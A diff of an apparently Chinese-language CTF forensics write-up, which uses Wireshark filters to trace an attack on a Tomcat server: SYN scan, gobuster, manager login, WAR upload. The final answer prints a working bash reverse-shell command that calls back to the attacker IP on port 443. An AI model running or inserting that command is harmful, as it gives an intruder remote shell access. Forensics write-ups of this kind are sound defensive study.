@@ -60,12 +60,17 @@ repost:
 tcp.flags.syn == 1
 ```
 
+
+
 ![](images/3255da578c98b68e7c04d1898cd927fa.png)
+
 发现大部分的SYN包来自于`14.0.0.120`
 第一问：flag{14.0.0.120}
 
 网站直接查询[IP归属地查询 - 在线工具](https://tool.lu/ip/)
+
 ![](images/0e08aabc1a2e6b4917c07c15cfb9cf1a.png)
+
 第二问：flag{guangzhou}
 
 tomacat的默认端口为`8080`，或者过滤查找请求为`200`
@@ -74,7 +79,10 @@ tomacat的默认端口为`8080`，或者过滤查找请求为`200`
 http contains "200"
 ```
 
+
+
 ![](images/42c89dcd79add54ae0098c27d5ea1736.png)
+
 第三问：flag{8080}
 
 过滤ip为`14.0.0.120`的攻击源，并查看`http`报文，过滤GET请求
@@ -83,7 +91,10 @@ http contains "200"
 ip.src_host == 14.0.0.120 && http && http.request.method == "GET"
 ```
 
+
+
 ![](images/382c9e48b96acab60b9569a8257343ed.png)
+
 第四问：flag{gobuster}
 
 tomcat的管理面板默认路径为`url/manager`
@@ -92,11 +103,16 @@ tomcat的管理面板默认路径为`url/manager`
 ip.src_host == 14.0.0.120 && http.uri contains "/manager"
 ```
 
+
+
 ![](images/8269a4fd939d9e9f9a6e952da3c3d7e6.png)
+
 第五问：flag{admin-tomcat}
 
 同上还是这个包，往下翻
+
 ![](images/e02482bde4c0e7cb795e940a31339b8c.png)
+
 第六问：flag{JXQOZY.war}
 
 上题题目提到建立了反弹shell，直接过滤
@@ -106,6 +122,8 @@ ip.src_host == 14.0.0.120 && frame contains "bin/bash"
 ```
 
 追踪`TCP流`
+
 ![](images/d880c73d1c7caa82253985d9d39717ce.png)
+
 攻击者通过`cron -i cron`命令定时反弹shell
 第七问：flag{/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'}
